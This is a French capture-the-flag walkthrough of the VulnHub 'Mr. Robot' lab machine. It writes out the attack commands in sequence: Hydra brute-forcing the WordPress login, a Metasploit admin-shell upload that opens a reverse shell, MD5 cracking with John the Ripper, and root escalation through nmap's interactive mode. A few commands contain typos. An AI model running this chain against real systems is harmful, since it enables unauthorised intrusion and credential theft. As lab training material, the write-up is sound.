## Installation 

Installer mon projet avec   : 

```
https://download.vulnhub.com/mrrobot/mrRobot.ova
```

Basé sur l'émission, Mr. Robot.

Cette machine virtuelle a trois clés cachées à différents endroits. Votre objectif est de trouver les trois. Chaque clé est progressivement difficile à trouver.

La VM n'est pas trop difficile. Il n'y a pas d'exploitation avancée ou d'ingénierie inverse. Le niveau est considéré comme débutant-intermédiaire.

# --------------------------------------------
Ifconfig pour connaitre notre réseau : 
![ifconfig](SCREENMROBOT/ifconfig.png)
Je commence par scanner le réseaux avec la commande
netdiscover -r 192.168.130.184/24.
J'utilise l'attribut ```-r``` pour scanner un réseaux spécifique (plage d'adresses IP) .
![id ip ](SCREENMROBOT/idip.png)

Pour voir si la machine est en marche je vais utiliser fping . 

![fping](SCREENMROBOT/fping.png)

# --------------------------------------------
## NMAP

![nmap](SCREENMROBOT/nmap.png)

```bash
  nmap -sC -sV -p IP
```
Les options que j'ai choisit sont : 
-Sc : Cela équivaut à --script=default.
-sV : Détection de version
-p : Pour les ports 1 à 65 585

On remarque donc que nous avons du :
-Du Web avec les protocoles ( 80 et 443 )
-Le serveur web est sous apache . 
# --------------------------------------------

## GOBUSTER


Gobuster est un tool qui énumère les répertoires et fichiers cachés dans le domaine cible en effectuant une attaque par force brute.

La requete que j'ai fait :

```bash
  gobuster dir -u ip -w 
```

-w : permet de préciser une wordlist (dans mon cas j'ai utilisé une wordlist deja sur kali)


![nmap](SCREENMROBOT/gobuster.png)

Ayant trouvé différents répertoires contenant l'attribut WP notamment :

Wp-admin 
Wp-content

j'émets une hypothèse comme quoi ça serait surement un site sur wordpress , je vais donc utiliser un tool adapté pour WPScan . 
# --------------------------------------------
## WPSCAN

WPScan WordPress est un outils utilisé par les professionnels de la sécurité des services informatiques et les mainteneurs de blogs afin de tester la sécurité de leurs sites Web WordPress.

J'effectue donc un WPScan sur l'url 192.168.130.63

![nmap](SCREENMROBOT/WPSCAN.png)

Plusieurs choses intéressentes dans cette capture on remarque déjà un lien spécifique dans le site /robots.txt à visiter par la suite puis des auxilary a utiliser .
# --------------------------------------------
## Visualisation du site 

Il est vrai que pour l'instant je n'ai montré aucun visuel du site voici à quoi il ressemble :

![nmap](SCREENMROBOT/fsocity.jpg)

On est plongé dans une sorte de machine Linux on peut utiliser quelque commande qui nous renvoie vers d'autre pages contenant des images ou des vidéos pas grand-chose à exploiter .

![verification](SCREENMROBOT/readme.png)

En changeant de répertoire je me suis rendu compte que je suis bel est bien sûr un site qui utilise le CMS Wordpress .

Je vais donc aller sur le repertoire /robots.txt

![verification](SCREENMROBOT/flag.png)
Bingo premiere clé trouver ,
avec un fichier nomée : fsocity.dic 

Je décide donc de le télécharger de le mettre dans mon bureau . 

![verification](SCREENMROBOT/dic.png)


# --------------------------------------------
Curieux de ce fichier téléchargé je décide donc de l'ouvrir mais avant de savoir combien de ligne il y a dans ce fameux fichier ce qu'il me semble sur c'est un fichier ou plutôt un dictionnaire a mot de passe .

![verification](SCREENMROBOT/wcl.png)

Le fichier contient donc 858 160 lignes c'est donc bien un dictionnaire à mot de passe . 

Je vais donc pouvoir m'en servir dans la suite pour l'exploitation . 

# --------------------------------------------
## Burpsuite & Hydra

Tout d'abord je me rend dans /wp-login.php ce qui est donc la page de connection pour les utilisateur et administrateur d'une page utilisant le CMS Wordpress . 

![verification](SCREENMROBOT/valeurandom.PNG)

J'essaie donc de rentrer des identifiants et un mot de passe par hasard . j'ai donc le retour d'une erreur : invalid username une piste  ??? 

![verification](SCREENMROBOT/lostpassword.jpg)

Pour la suite je vais donc utilise Burpsuite l'ayant déjà utilisé notamment sur des challenges root-me, je sais donc comment il fonctionne, je l'installe dans ma machine puis j'intercepte donc la requête envoye au serveur

![verification](SCREENMROBOT/burp.jpg)

J'ai encadré en rouge la requete . 
log = tess & pwd = 123

log = identifiant 
pwd = mot de passe 

J'ai donc une idée je vais me servir d'un autre outil nomée Hydra pour essaye de trouver l'identifiant et le mot de passe grace au fichier trouver precedment fsocity.dic

![verification](SCREENMROBOT/login.jpg)
Requete de base de Hydra ,
Requete effectue :  
`hydra -vV -L fsocity.dic -p test IP http-post-form '/wp-login.php:log=^USRE^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username `

-vV : Permet d'avoir le retour des test en mode Verbose 
-L : Login utiliser par le fichier fsocity.dic
-p : password
Puis l'IP avec la requete http-post-form `/wp-login.php`

Le plus important ce trouve a la fin de la requete c'est le message d'erreur à indique c'est donc grace à lui que je vais reussir à trouver le login Elliot . 


Je vais par la suite faire la meme requete mais en changeant un peu le style de la requete  :

`hydra -vV -l Elliot  -p fsocity.dic IP http-post-form '/wp-login.php:log=^USRE^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password `


![verification](SCREENMROBOT/hydramdp.jpg)

![verification](SCREENMROBOT/motdepasse.jpg)

Après 12 min nous obtenons un mot de passe .

Je peux donc maintenant me connecter au Wordpress avec comme 

### Identifiant : Elliot
### Mot de passe : ER28-0652

# --------------------------------------------#

## CONNEXION WORDPRESS



![verification](SCREENMROBOT/menuwordpress.jpg)

Première remarque le CMS n'est pas à jour car la version actuelle est la 6.1.1, il est donc conseille de mettre le CMS à jour .

Puis je décide d'aller voir les Plugins . 

![verification](SCREENMROBOT/plugins.jpg)

Deuxième remarque plugins également pas à jour ..

# --------------------------------------------

## METASPLOIT & REVERSE SHELL


Je décide donc d'utiliser pour la suite Metasploit, je commence par chercher un exploit contenant du wordpress en mode administrateur

![verification](SCREENMROBOT/show.PNG)


Je vais donc partir pour un exploit/unix/webapp/wp_admin_shell_upload . 
Il faut savoir que par défaut le payload configurer est un php/meterpreter/reverse_tcp

Avant de commencer l'exploit toujours la bonne habitude a prendre un petit `show options`
Je vais donc venir configurer le PASSWORD , RHOSTS et USERNAME avec
`set PASSWORD ER28-0652`
`set RHOSTS 192.168.130.63`
`set USERNAME elliot`

Dans le screen j'avais déjà configurer le LHOST ainsi que le port d'écoute qui sera le 4444 . 

![verification](SCREENMROBOT/scanner.jpg)


Puis lorsque j'ai lance la première fois j'ai eu une erreur :


![verification](SCREENMROBOT/wpcheck.jpg)

D'après ce que j'ai compris d'un github que j'ai trouvé en faisant des recherches il faut décocher le wp check qui est par défaut activé qui gérer pour voir la bonne installation de wordpress, si besoin de plus de détails voir Documentation.

Apres désactiver le wp check je relance donc mon exploit :


![verification](SCREENMROBOT/wpcheckfalse.jpg)

Parfait cela fonctionne je vais donc pouvoir lancer mon reverse shell 


![verification](SCREENMROBOT/shell.jpg)

Comme nous avons pu voir afin de rendre le shell plus utilisable je vais importer un script python .

Puis je vais me balader dans les repertoires .


![verification](SCREENMROBOT/linux.jpg)

Je vais revenir a la racine du système / 
Puis dans le /home je vais trouver quelque chose d'intéressent contenant un autre repertoire nommé robot . 


![verification](SCREENMROBOT/robot.jpg)

Et voila la deuxieme clé est trouve , mince je n'es pas les droit de pouvoir l'afficher je vais donc essaye d'afficher le deuxieme fichier `password.raw-md5`

![verification](SCREENMROBOT/rawmd5.jpg)

Surement un nom utilisateur avec un mot de passe encrypté je copie et colle sur un fichier texte je vais donc essaye de voir si je peux cracker quelque chose avec johntheripper .

utilisateur    password
  robot     :  c3fcd3d76192e4007dfb496cca67e13b


![verification](SCREENMROBOT/rockyou.jpg)

Au début cela n'a pas fonctionné car je n'ai pas préciser le type d'hash , je vais utiliser en worlist une des plus connues rockyou.txt.

Donc je relance avec --format=Raw-MD5 plutot simple a trouver quand on sait que le fichier est nommé passwordm5 j'aurai pu également utilisé hashcat . 

Je trouve donc comme mot de passe : abcdefghijklmnopqrstuvwxyz


![verification](SCREENMROBOT/privilege.jpg)

Je suis passe de daemon@linux 
a un utilisateur : robot@linux


Puis en me baladent dans les dossiers je vais voir qu'il y a un Nmap d'installer. sur la machine , je décide donc de lancer le nmap en mode interactive 
`nmap --interactive`

![verification](SCREENMROBOT/root.jpg)

Je vais par la suite aller voir dans les repertoire du superutilisatuer faire un cd /root 
puis un ls 
![verification](SCREENMROBOT/cdroote.jpg)
3 eme cle trouver je decide donc de l'afficher .
![verification](SCREENMROBOT/dernierecl.jpg)
# --------------------------------------------

## CONCLUSION

### •Cette machine m’a permis de découvrir les failles sur le CMS Wordpress et par la suite d’utiliser des outils web tel que 
-Gobuster
-Wpscan 
-Burpsuite. 
### Il faut donc faire bien attention à avoir mis à jour son Wordpress ainsi que ces plugins si on en utilise ce CMS. Car sinon ils sont vulnérables à ce type d'attaque web.

# --------------------------------------------#
## Auteur
- [@theodufour](https://github.com/TheoDfr)
## Documentation
[Managing Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)
[Netdiscover](https://www.oreilly.com/library/view/kali-linux-2018/9781789341768/487203a3-1d14-44f1-8256-b3d97a46f63a.xhtml#:~:text=To%20launch%20Netdiscover%2C%20type%20netdiscover,ve%20used%20netdiscover%20–r%2010.10.)
[Nmap](https://nmap.org/man/fr/man-version-detection.html)
[Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
[Nikto](https://memo-linux.com/nikto-outil-scanner-de-securite-serveur-web/)
[Gobuster](https://www.kali.org/tools/gobuster/)
[WPScan](https://wpscan.com/wordpress-security-scanner)
[Set wp-check false](https://github.com/rapid7/metasploit-framework/issues/10838)


